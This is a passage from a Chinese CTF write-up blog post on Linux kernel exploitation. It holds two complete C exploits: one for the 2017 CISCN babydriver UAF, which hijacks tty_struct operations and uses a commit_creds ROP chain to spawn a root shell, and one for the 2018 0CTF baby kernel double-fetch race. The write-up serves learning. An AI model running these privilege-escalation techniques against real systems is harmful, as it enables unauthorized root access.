+<p>从调试结果上看最后跳转到了ret上那就没什么问题了，所以我们把<code>tty_ops</code>的前面稍微布置一下实现再一次栈迁移即可</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://picture-1311455354.cos.ap-shanghai.myqcloud.com/image-20230127205140969.png" alt></p>
+<p>有些wp上用到了堆喷，问了下nightu师傅，堆喷射是为了提高命中率，因为不止一个程序与内核沟通，所以为了防止造成UAF的堆块被其他的进程抢走，可以多次开大量相同堆块，来做到劫持<code>tty_struct</code></p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET 0xffffffff8144d302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff810dec19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPRBP_RET 0xffffffff81063694</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(getuid())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">	saveStatus();</span><br><span class="line"></span><br><span class="line">	FILE* sym_table_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">size_t</span> addr;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			commit_creds = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			prepare_kernel_cred = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            		<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">size_t</span> rop_chain[<span class="number">100</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = POP_RDI_RET;</span><br><span class="line">	rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = prepare_kernel_cred;</span><br><span class="line">	rop_chain[i++] = POP_RDX_RET;</span><br><span class="line">	rop_chain[i++] = POP_RDX_RET;</span><br><span class="line">	rop_chain[i++] = MOV_RDI_RAX_CALL_RDX;</span><br><span class="line">	rop_chain[i++] = commit_creds;</span><br><span class="line">	rop_chain[i++] = SWAPGS_POPRBP_RET;</span><br><span class="line">	rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = IRETQ_RET;</span><br><span class="line">	rop_chain[i++] = (<span class="type">size_t</span>)getRootShell;</span><br><span class="line">	rop_chain[i++] = user_cs;</span><br><span class="line">	rop_chain[i++] = user_rflags;</span><br><span class="line">	rop_chain[i++] = user_sp;</span><br><span class="line">	rop_chain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line">	close(fd1);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> fake_ops[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		fake_ops[i] = <span class="number">0xffffffff8181bfc5</span>;<span class="comment">//mov rsp, rax; dec ebx; jmp xxx;</span></span><br><span class="line">	&#125;</span><br><span class="line">	fake_ops[<span class="number">0</span>] = <span class="number">0xffffffff8100ce6e</span>;<span class="comment">//pop rax; ret;</span></span><br><span class="line">	fake_ops[<span class="number">1</span>] = rop_chain;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> buf2[<span class="number">0x20</span>];</span><br><span class="line">	read(fd2, buf2, <span class="number">0x20</span>);</span><br><span class="line">	buf2[<span class="number">3</span>] = fake_ops;</span><br><span class="line">	write(fd2, buf2, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	write(fd3, buf2, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload src="/images/loading.svg" data-src="https://picture-1311455354.cos.ap-shanghai.myqcloud.com/image-20230127205400377.png" alt></p>
+<h2 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h2><p>属于条件竞争漏洞，是内核态和用户态之间的数据访问竞争，以此来绕过一些检测比如说数据的长度来达到溢出的效果等等</p>
+<h3 id="2018-0CTF-baby-kernel"><a href="#2018-0CTF-baby-kernel" class="headerlink" title="[2018 0CTF]baby kernel"></a>[2018 0CTF]baby kernel</h3><p>创建线程这东西我还第一次用，照着wp的思路打了一遍，条件竞争漏洞u1s1还挺有意思的，因为如果只是从单线程思考的话，程序的逻辑是完全没有问题的。但是由于kernel pwn是由攻击者编写程序运行所以启多个线程来造成条件竞争是能做到的</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> finish = <span class="number">1</span>;</span><br><span class="line"><span class="type">size_t</span> flag_addr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FLAG</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span>* flag;</span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line">&#125; data;</span><br><span class="line"></span><br><span class="line">competition_func(<span class="type">size_t</span> t)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">FLAG</span>* <span class="title">s</span> =</span> t;</span><br><span class="line">	<span class="keyword">while</span>(finish)</span><br><span class="line">	&#123;</span><br><span class="line">		s-&gt;flag = flag_addr;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/baby&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd1&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /dev/baby !\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ioctl(fd1, <span class="number">0x6666</span>);</span><br><span class="line">	system(<span class="string">&quot;dmesg | grep flag &gt;/tmp/addr&quot;</span>);</span><br><span class="line">	<span class="type">int</span> fd2 = open(<span class="string">&quot;/tmp/addr&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd2&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /tmp/addr !\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* temp = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">	read(fd2, temp, <span class="number">0x100</span>);</span><br><span class="line">	<span class="type">char</span>* start = <span class="built_in">strstr</span>(temp, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(start == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] Not Found!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	flag_addr = strtoull(start+<span class="number">16</span>, start+<span class="number">32</span>, <span class="number">16</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] flag_addr : %p\033[0m\n&quot;</span>, flag_addr);</span><br><span class="line"></span><br><span class="line">	data.flag = temp;</span><br><span class="line">	data.len = <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">pthread_t</span> t;</span><br><span class="line">	pthread_create(&amp;t, <span class="literal">NULL</span>, competition_func, &amp;data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(finish)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ioctl(fd1, <span class="number">0x1337</span>, &amp;data) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] get flag! \033[0m\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		data.flag = temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	finish = <span class="number">0</span>;</span><br><span class="line">	pthread_join(t, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>运行完去内核日志找就行了，因为没开<code>dmesg_restrict</code>，所有printk的输出都可以在里面找到</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Kernel Pwn记录</li>
+        <li>Post author：hash_hash</li>
+        <li>Create time：2023-01-15 17:13:08</li>
+        <li>
+            Post link：https://hash-hash.github.io/2023/01/15/Kernel-Pwn记录/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/kernel/">#kernel</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/01/14/VM-Pwn%E8%AE%B0%E5%BD%95/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">VM Pwn记录</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div style="font-size: 1.3rem;margin-top: 0; margin-bottom: 0.8rem; transition-duration: 0.1s;"><i class="fa-solid fa-list"></i> <strong>Contents</strong></div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">保护机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kernel-Rop"><span class="nav-text">Kernel Rop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2018QWB-core"><span class="nav-text">[2018QWB]core</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2022CATCTF-kernel-test"><span class="nav-text">[2022CATCTF]kernel-test</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kernel-UAF"><span class="nav-text">Kernel UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2017CISCN-babydriver"><span class="nav-text">[2017CISCN]babydriver</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Fetch"><span class="nav-text">Double Fetch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2018-0CTF-baby-kernel"><span class="nav-text">[2018 0CTF]baby kernel</span></a></li></ol></li></ol>
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;<i class="fa-solid fa-heart icon-animate"></i>&nbsp;<a href="/">hash_hash. All Rights Reserved.</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v0.4.4</a>
+        </div>
+        
+        
+        <script async data-pjax defer>
+            function odometer_init(){
+                    let el = document.getElementsByClassName('odometer');
+                    for (i = 0; i < el.length; i++) {
+                        od = new Odometer({
+                            el: el[i],
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    }
+            }
+            odometer_init();
+        </script>
+        <div id="start_time_div" style="display:none">
+            2022/8/17 11:45:14
+        </div>
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fa-solid fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fa-solid fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fa-solid fa-left-right"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fa-solid fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fa-solid fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fa-solid fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fa-solid fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/runtime.js"></script>
+
+    
+<script src="/js/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/css/odometer-theme-minimal.css">
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/toc-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            REDEFINE.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            REDEFINE.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            REDEFINE.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
